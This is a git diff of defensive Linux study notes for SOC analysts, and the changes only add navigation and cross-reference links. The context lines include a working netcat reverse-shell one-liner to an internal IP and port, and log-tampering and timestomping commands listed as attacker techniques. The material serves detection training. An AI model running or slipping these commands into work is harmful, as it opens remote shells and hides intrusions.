@@ -1,7 +1,9 @@
 # Linux — SOC Analyst Study Notes
 
+> **Navigation:** [Roadmap index](../README.md) · [← File Systems](File-Systems.md) · [Permissions →](Permissions.md)
+
 > Goal: understand Linux enough to **triage SSH attacks, reverse shells, web-shell/RCE, persistence, privilege escalation, cryptominers, rootkits, and log tampering** on servers, cloud VMs, and containers.
-> File-system internals → `File-Systems.md`; permissions/ACLs → `Permissions.md`; Windows equivalents → `Windows.md`.
+> File-system internals → [File-Systems.md](File-Systems.md); permissions/ACLs → [Permissions.md](Permissions.md); Windows equivalents → [Windows.md](Windows.md).
 
 ---
 
@@ -286,7 +288,7 @@ mkfifo /tmp/f; nc 10.0.0.5 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1
 - **Kernel modules** — hook syscalls; `lsmod` may hide; check `/proc/modules`, `dmesg`.
 - **LD_PRELOAD** rootkits — `/etc/ld.so.preload`, env vars.
 - **Log tampering** — truncate/delete logs, stop rsyslog/auditd, `history -c`, `unset HISTFILE`, `journalctl --vacuum`.
-- **Timestomping** — `touch -r`, `touch -t`; cross-ref `File-Systems.md`.
+- **Timestomping** — `touch -r`, `touch -t`; cross-ref [File-Systems.md](File-Systems.md).
 - **Hidden files/processes** — dotfiles, unicode names, `/dev/shm`, deleted binaries.
 
 ### 7.7 Containers
@@ -555,7 +557,7 @@ level: high
 
 ### Step 5 — Check network activity
 - `ss -tulpen`, `lsof -i`, `/proc/net/*`.
-- Outbound destinations, DNS, TLS SNI (cross-ref `TCP-IP.md`, `DNS.md`).
+- Outbound destinations, DNS, TLS SNI (cross-ref [TCP-IP.md](../01%20-%20Networking%20Fundamentals/TCP-IP.md), [DNS.md](../01%20-%20Networking%20Fundamentals/DNS.md)).
 
 ### Step 6 — Check files and integrity
 - New/modified files in temp, webroot, home, `/etc`.
@@ -825,3 +827,7 @@ sudo tcpdump -ni any -s0 -w /evidence/traffic.pcap host 10.0.0.5
 - [ ] Triage: SSH brute, reverse shell, web shell, privesc, persistence, miner, rootkit/log tampering, container escape, exfil.
 - [ ] Commands: `ps`/`pstree`, `/proc`, `ss`/`lsof`, `getent`, `sudo -l`, `crontab`, `systemctl`, `find -perm`, `getcap`, `journalctl`, `ausearch`, `rpm -Va`/`debsums`, `aide`, `rkhunter`, `sha256sum`, `tcpdump`.
 - [ ] Hardening: SSH hardening, least privilege, patching, SELinux/AppArmor, auditd, persistent/remote logging, FIM/EDR, disable unused, container hardening, secrets, backups, sysctl, MFA, egress, IR readiness.
+
+---
+
+> **Navigation:** [Roadmap index](../README.md) · [← File Systems](File-Systems.md) · [Permissions →](Permissions.md)
